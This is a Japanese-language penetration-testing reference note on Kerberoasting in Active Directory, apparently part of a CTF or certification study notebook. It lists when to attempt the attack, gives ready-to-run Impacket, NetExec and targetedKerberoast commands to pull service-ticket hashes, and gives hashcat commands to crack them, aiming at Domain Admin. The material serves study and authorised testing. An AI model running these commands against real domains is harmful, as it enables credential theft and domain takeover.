# Kerberoasting

## 概要

SPN（Service Principal Name）が設定されたドメインアカウントに対して、認証済みユーザーであれば誰でも TGS（サービスチケット）を要求できる。この TGS はアカウントのパスワードで暗号化されているため、オフラインでクラックすることでパスワードを復元できる。

---

## 着火条件

- ドメインへの認証情報がある（任意の低権限ユーザーで可）
- SPN が設定されたユーザーアカウントが存在する
- または、GenericWrite 権限で SPN を任意のアカウントに設定できる（Targeted Kerberoasting）

---

## 観点・着眼点

### Kerberoasting を思いつく流れ

**何が出たら使うか：**

| 出力・状況 | 判断 |
|-----------|------|
| 認証情報が取れた（どんな低権限でも） | → まず `GetUserSPNs` を実行して SPN 付きアカウントを確認する |
| `GetUserSPNs` の出力にアカウントが1件でも表示された | → Kerberoasting を実行してハッシュ取得へ |
| SPN が **Administrator** や高権限アカウントに設定されている | → 最優先でクラックする（成功すれば即 DA） |
| `enum4linux` や BloodHound でサービスアカウント（`SVC_xxx`）が発見された | → SPN が設定されている可能性が高い → GetUserSPNs で確認 |

**アカウント名がヒントになる場合：**
- `SVC_TGS`, `SVC_SQL`, `SVC_WEB` 等の `SVC_` プレフィックスはサービスアカウントを示唆
- ただし名前だけで判断せず、必ず `GetUserSPNs` で実際に確認する
- `SVC_TGS` という名前は「Ticket Granting Service」を示唆するが、**自分がそのアカウントを持っていることと、他のSPN付きアカウントが存在することは別の話**

**Administrator に SPN が設定されているケース：**
Administrator（最高権限）に SPN が設定されている場合、クラックに成功すれば直接 DA になれる。`GetUserSPNs` の出力で `Administrator` という名前が現れたら最優先で対処する。

**SPN 付きアカウントを探す：**
通常のサービスアカウント（`svc_sql`, `svc_web` 等）に使われることが多い。パスワードが弱いサービスアカウントは特に狙い目。

**Targeted Kerberoasting：**
通常は SPN のないアカウントでも、`GenericWrite` 権限があれば任意のアカウントに SPN を設定してハッシュを取得できる。

---

## 手順

### 標準 Kerberoasting

**Impacket を使用（Linux）：**
```bash
impacket-GetUserSPNs \
  '[DOMAIN]/[USER]:[PASSWORD]' \
  -dc-ip [DC_IP] \
  -request \
  -outputfile kerberoast_hashes.txt
```

**NetExec を使用：**
```bash
netexec ldap [DC_IP] -u [USER] -p '[PASSWORD]' --kerberoasting kerberoast.txt
```

### Targeted Kerberoasting（GenericWrite 権限を使用）

```bash
python3 targetedKerberoast.py -v \
  -d '[DOMAIN]' \
  -u '[USER]' \
  -p '[PASSWORD]' \
  --dc-ip [DC_IP] \
  -o targeted_hashes.txt
```

このツールは SPN の付与・ハッシュ取得・SPN のクリーンアップを自動で行う。

---

## ハッシュのクラック

取得したハッシュ（`$krb5tgs$23$...` 形式）を hashcat でクラック：

```bash
# -m 13100 は Kerberos TGS-REP etype 23 (RC4)
hashcat -m 13100 kerberoast_hashes.txt /usr/share/wordlists/rockyou.txt

# ルールファイルを使った強化
hashcat -m 13100 kerberoast_hashes.txt /usr/share/wordlists/rockyou.txt \
  -r /usr/share/hashcat/rules/best64.rule

# AES 暗号化の場合（etype 18）
hashcat -m 19700 kerberoast_hashes.txt /usr/share/wordlists/rockyou.txt
```

→ 詳細: `../../05_Tools_Reference/Hashcat.md`

---

## 注意点・落とし穴

- AES 暗号化（etype 17/18）のハッシュは RC4（etype 23）より解析が困難。可能であれば RC4 ダウングレードを試みる（`--rc4-support` オプション）
- パスワードが強力な場合はクラックできない → 別の攻撃手法に切り替える
- ハッシュが取得できても `No entries found!` の場合は SPN 付きアカウントが存在しない → Targeted Kerberoasting を検討

---

## 関連技術
- SPN を付与する → `../ACE_Abuse/GenericWrite.md`
- ハッシュのクラック → `../../05_Tools_Reference/Hashcat.md`
- クラックしたパスワードで → `../../02_Initial_Access/Credential_Discovery.md`（使い回し確認）
